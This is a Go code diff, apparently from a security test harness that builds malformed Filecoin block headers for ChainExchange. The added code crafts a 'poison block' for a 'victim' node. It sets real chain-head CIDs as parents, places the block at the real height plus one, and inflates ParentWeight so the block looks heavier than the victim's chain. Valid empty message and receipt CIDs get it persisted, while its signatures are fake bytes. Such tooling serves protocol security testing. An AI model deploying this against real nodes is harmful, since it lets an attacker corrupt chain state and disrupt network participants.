@@ -232,6 +232,16 @@ type blockHeaderOpts struct {
 	overrideCIDs *sharedBlockCIDs
 	// overrideMiner lets each block in a multi-block tipset have a distinct miner
 	overrideMiner []byte
+
+	// overrideParentCIDs uses real chain-head CIDs as parents so the victim
+	// can verify chain ancestry and actually stores the block.
+	overrideParentCIDs []cid.Cid
+	// overrideHeight sets the block height (used with overrideParentCIDs to
+	// place the poison block at real_height + 1).
+	overrideHeight uint64
+	// overrideWeight sets the ParentWeight field (used to make the block
+	// appear heavier than the victim's current chain).
+	overrideWeight uint64
 }
 
 // sharedBlockCIDs holds pre-generated CIDs that multiple blocks can share
@@ -303,15 +313,25 @@ func buildBlockHeaderCBOR(opts blockHeaderOpts) []byte {
 		parents = cborNil()
 	} else if opts.emptyParents {
 		parents = cborArray()
+	} else if len(opts.overrideParentCIDs) > 0 {
+		parents = cborCIDArray(opts.overrideParentCIDs)
 	} else {
 		parents = cborCIDArray([]cid.Cid{dummyCID})
 	}
 
 	// Field 6: ParentWeight — BigInt bytes
-	parentWeight := cborBytes(bigIntBytes(1))
+	weight := uint64(1)
+	if opts.overrideWeight > 0 {
+		weight = opts.overrideWeight
+	}
+	parentWeight := cborBytes(bigIntBytes(weight))
 
 	// Field 7: Height — uint64
-	height := cborUint64(1)
+	h := uint64(1)
+	if opts.overrideHeight > 0 {
+		h = opts.overrideHeight
+	}
+	height := cborUint64(h)
 
 	// Field 8: ParentStateRoot — CID
 	stateRootCID := dummyCID
@@ -320,37 +340,41 @@ func buildBlockHeaderCBOR(opts blockHeaderOpts) []byte {
 	}
 	parentStateRoot := cborCID(stateRootCID)
 
-	// Field 9: ParentMessageReceipts — CID
-	msgReceiptsCID := dummyCID
+	// Field 9: ParentMessageReceipts — CID (use valid empty AMT root)
+	msgReceiptsCID := emptyAMTCID
 	if opts.overrideCIDs != nil {
 		msgReceiptsCID = opts.overrideCIDs.msgReceipts
 	}
 	parentMsgReceipts := cborCID(msgReceiptsCID)
 
-	// Field 10: Messages — CID
-	messagesCID := dummyCID
+	// Field 10: Messages — CID (must match CompactedMessages for block to be persisted)
+	messagesCIDVal := emptyMsgMetaCID
 	if opts.overrideCIDs != nil {
-		messagesCID = opts.overrideCIDs.messagesCID
+		messagesCIDVal = opts.overrideCIDs.messagesCID
 	}
-	messages := cborCID(messagesCID)
+	messages := cborCID(messagesCIDVal)
 
-	// Field 11: BLSAggregate — [Type uint64, Data bytes] or null
+	// Field 11: BLSAggregate — Signature encoded as CBOR byte string via MarshalBinary
+	// Filecoin Signature binary format: [type_byte | data_bytes]
+	// BLS type = 2
 	var blsAggregate []byte
 	if opts.nilBLSAggregate || opts.allNil {
 		blsAggregate = cborNil()
 	} else {
-		blsAggregate = cborArray(cborUint64(2), cborBytes([]byte{})) // BLS type = 2
+		blsAggregate = cborBytes([]byte{0x02}) // BLS type=2, empty sig data
 	}
 
 	// Field 12: Timestamp — uint64
 	timestamp := cborUint64(1700000000)
 
-	// Field 13: BlockSig — [Type uint64, Data bytes] or null
+	// Field 13: BlockSig — Signature encoded as CBOR byte string via MarshalBinary
+	// Filecoin Signature binary format: [type_byte | data_bytes]
+	// BLS type = 2
 	var blockSig []byte
 	if opts.nilBlockSig || opts.allNil {
 		blockSig = cborNil()
 	} else {
-		blockSig = cborArray(cborUint64(2), cborBytes(randomBytes(8)))
+		blockSig = cborBytes(append([]byte{0x02}, randomBytes(8)...))
 	}
 
 	// Field 14: ForkSignaling — uint64
@@ -371,6 +395,56 @@ func buildBlockHeaderCBOR(opts blockHeaderOpts) []byte {
 func blockCIDFromCBOR(blockCBOR []byte) cid.Cid {
 	mh, _ := multihash.Sum(blockCBOR, multihash.BLAKE2B_MIN+31, -1)
 	return cid.NewCidV1(cid.DagCBOR, mh)
+}
+
+// parseRequestOptions extracts the Options uint64 from a ChainExchange request.
+// Request wire format: CBOR array(3) [Head []CID, Length uint64, Options uint64]
+// Returns 0 on any parse error (safe default — no headers, no messages).
+func parseRequestOptions(data []byte) uint64 {
+	if len(data) < 2 {
+		return 0
+	}
+	r := bytes.NewReader(data)
+
+	// Read array header (expect 3 elements)
+	maj, _, err := cbg.CborReadHeader(r)
+	if err != nil || maj != cbg.MajArray {
+		return 0
+	}
+
+	// Skip Head: array of CIDs — read inner array header then skip each element
+	maj, nCIDs, err := cbg.CborReadHeader(r)
+	if err != nil || maj != cbg.MajArray {
+		return 0
+	}
+	for i := uint64(0); i < nCIDs; i++ {
+		// Each CID is: tag(42) + bytestring
+		maj, _, err := cbg.CborReadHeader(r)
+		if err != nil {
+			return 0
+		}
+		if maj == cbg.MajTag {
+			// Read the byte string after tag
+			maj, bsLen, err := cbg.CborReadHeader(r)
+			if err != nil || maj != cbg.MajByteString {
+				return 0
+			}
+			r.Seek(int64(bsLen), 1) // skip bytes
+		}
+	}
+
+	// Skip Length uint64
+	maj, _, err = cbg.CborReadHeader(r)
+	if err != nil || maj != cbg.MajUnsignedInt {
+		return 0
+	}
+
+	// Read Options uint64
+	maj, options, err := cbg.CborReadHeader(r)
+	if err != nil || maj != cbg.MajUnsignedInt {
+		return 0
+	}
+	return options
 }
 
 // bigIntBytes encodes a big integer value as Filecoin-style BigInt bytes.
